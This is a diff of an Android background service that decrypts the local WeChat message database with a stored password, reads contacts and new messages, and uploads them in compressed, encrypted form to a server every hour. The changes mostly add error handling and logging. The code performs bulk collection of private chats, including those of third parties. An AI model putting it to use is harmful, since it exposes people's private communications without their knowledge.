@@ -38,11 +38,7 @@ import java.util.List;
 import okhttp3.MediaType;
 import okhttp3.MultipartBody;
 import okhttp3.RequestBody;
-import retrofit2.Call;
-import retrofit2.Callback;
-import retrofit2.Response;
 import rx.Observable;
-import rx.Subscription;
 import rx.android.schedulers.AndroidSchedulers;
 import rx.functions.Func1;
 import rx.schedulers.Schedulers;
@@ -51,9 +47,7 @@ public class UploadService extends Service {
 
     private boolean isUpLoading = false;
     private int uploadCycleTime = 60 * 60 * 1000; //上传周期
-
     private User user;
-
     private SQLiteDatabaseHook hook;
     //微信数据库32位文件名字
     private String wxFilename;
@@ -62,6 +56,9 @@ public class UploadService extends Service {
     //简单的String talkerList 列表
     private List<String> talkerList;
     private Gson gson;
+    //错误日志
+    private List<String> errorLog;
+
 
     @Nullable
     @Override
@@ -83,21 +80,21 @@ public class UploadService extends Service {
             }
         };
         SQLiteDatabase.loadLibs(this);
-
         wxFilename = user.getFilename();
         pwdWxDb = user.getWxdbpwd();
         talkerList = new ArrayList<>();
         gson = new Gson();
+        errorLog = new ArrayList<>();
     }
 
     @Override
     public int onStartCommand(Intent intent, final int flags, int startId) {
         Log.v("Lin", "Service:onStartCommand");
+
         if (!isUpLoading) {
             isUpLoading = true;
-
-            doService2();
-
+            Log.v("Lin", "doService");
+            doService();
         }
 
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
@@ -114,7 +111,7 @@ public class UploadService extends Service {
 
     }
 
-    private void doService2() {
+    private void doService() {
 
         Observable.just("Hello")
                 .map(new Func1<String, List<RContactForUpload>>() {
@@ -128,7 +125,7 @@ public class UploadService extends Service {
                     @Override
                     public Observable<ReturnResult> call(List<RContactForUpload> rContactForUploads) {
                         Log.v("Lin", "上传联系人");
-                        Log.v("Lin","联系人的数量："+rContactForUploads.size());
+                        Log.v("Lin", "联系人的数量：" + rContactForUploads.size());
                         String messageJson = gson.toJson(rContactForUploads);
                         String encryptMessageJson = EncryptUtil.encryptGZIP(messageJson);
                         return ApiManager.getClientNoCache().uploadFansRxJava(user.getToken(),
@@ -141,6 +138,8 @@ public class UploadService extends Service {
                         Log.v("Lin", "获取信息");
                         if (returnResult.getStatus() == 0) {
                             return getUploadMessages();
+                        } else {
+                            errorLog.add(returnResult.getMsg());
                         }
                         return null;
                     }
@@ -149,8 +148,12 @@ public class UploadService extends Service {
                     @Override
                     public Observable<ReturnResult> call(List<UploadMessage> uploadMessages) {
                         Log.v("Lin", "上传信息");
-                        return ApiManager.getClientNoCache().uploadMessagesRxJava(user.getToken(),
-                                user.getAlias(), EncryptUtil.encryptGZIP(gson.toJson(uploadMessages)));
+                        if (uploadMessages != null) {
+                            Log.v("Lin", "信息的数量：" + uploadMessages.size());
+                            return ApiManager.getClientNoCache().uploadMessagesRxJava(user.getToken(),
+                                    user.getAlias(), EncryptUtil.encryptGZIP(gson.toJson(uploadMessages)));
+                        }
+                        return null;
 
                     }
                 })
@@ -158,8 +161,12 @@ public class UploadService extends Service {
                     @Override
                     public File call(ReturnResult returnResult) {
                         Log.v("Lin", "压缩文件");
-                        if (returnResult != null && returnResult.getStatus() == 0) {
-                            return getZipFile();
+                        if (returnResult != null) {
+                            if (returnResult.getStatus() == 0) {
+                                return getZipFile();
+                            } else {
+                                errorLog.add(returnResult.getMsg());
+                            }
                         }
                         return null;
                     }
@@ -186,21 +193,27 @@ public class UploadService extends Service {
                 .subscribe(new BaseSubscriber<ReturnResult>(this) {
                     @Override
                     public void onError(Throwable e) {
-                        isUpLoading=false;
-                        Log.v("LIn", "未知错误"+e.toString());
+                        isUpLoading = false;
+                        Log.v("LIn", "未知错误" + e.toString());
+                        Toast.makeText(UploadService.this, e.toString(), Toast.LENGTH_SHORT).show();
                     }
 
                     @Override
                     public void onNext(ReturnResult returnResult) {
+
                         if (returnResult != null) {
-                            Log.v("LIn", returnResult.getStatus() + "");
-                            Log.v("LIn", returnResult.getMsg() + "");
+                            Log.v("LIn", returnResult.getMsg());
+                            Toast.makeText(UploadService.this, returnResult.getMsg(), Toast.LENGTH_SHORT).show();
+                        } else {
+                            Toast.makeText(UploadService.this, errorLog.get(errorLog.size() - 1), Toast.LENGTH_SHORT).show();
                         }
+
                     }
 
                     @Override
                     public void onCompleted() {
-                        isUpLoading=false;
+                        isUpLoading = false;
+                        errorLog.clear();
                     }
                 });
 
@@ -242,15 +255,16 @@ public class UploadService extends Service {
         List<UploadMessage> uploadMessageList = new ArrayList<>();
         //获取上次上传最后的msgId
         int lastMsgId = SharedPrefsUtil.getValue(this, "LastMsgId", 0);
-        Log.v("Lin", "lastMsgId:" + lastMsgId);
+        Log.v("Lin", "get-->lastMsgId:" + lastMsgId);
         try {
             SQLiteDatabase db = SQLiteDatabase.openDatabase(user.getWxdbpath(),
                     pwdWxDb, null, SQLiteDatabase.OPEN_READWRITE, hook);
 
-            Cursor cursor = db.rawQuery("select * from message where msgid>" + lastMsgId+"order by msgid asc", null);
+            Cursor cursor = db.rawQuery("select * from message where msgid>" + lastMsgId + " order by msgid asc", null);
 
             while (cursor.moveToNext()) {
                 WxMessage wxMessage = new WxMessage();
+                wxMessage.setMsgId(cursor.getInt(cursor.getColumnIndex("msgId")));
                 wxMessage.setType(cursor.getInt(cursor.getColumnIndex("type")));
                 wxMessage.setIsSend(cursor.getInt(cursor.getColumnIndex("isSend")));
                 wxMessage.setCreateTime(cursor.getInt(cursor.getColumnIndex("createTime")));
@@ -265,8 +279,11 @@ public class UploadService extends Service {
             Log.v("Lin", "获取微信数据库message表错误!" + e);
             return uploadMessageList;
         }
-        //保存最后一次的消息id (此处的id并不一定最大啊)
-        SharedPrefsUtil.putValue(this, "LastMsgId", wxMessageList.get(wxMessageList.size() - 1).getMsgId());
+        //保存最后一次的消息id
+        if (wxMessageList.size()>0){
+            Log.v("Lin", "set-->lastMsgId:" + wxMessageList.get(wxMessageList.size() - 1).getMsgId());
+            SharedPrefsUtil.putValue(this, "LastMsgId", wxMessageList.get(wxMessageList.size() - 1).getMsgId());
+        }
         //处理微信信息
         for (WxMessage wxMessage : wxMessageList) {
             if (talkerList.contains(wxMessage.getTalker())) {
@@ -327,6 +344,7 @@ public class UploadService extends Service {
                 uploadMessageList.add(uploadMessage);
             }
         }
+
         return uploadMessageList;
     }
 
@@ -353,7 +371,6 @@ public class UploadService extends Service {
             if (!kefu_alias_file_img.exists()) {
                 kefu_alias_file_img.mkdir();
             }
-
             //视频文件夹
             File kefu_alias_file_video = new File(kefu_alias_file.getPath() + "/" + "video");
             if (!kefu_alias_file_video.exists()) {
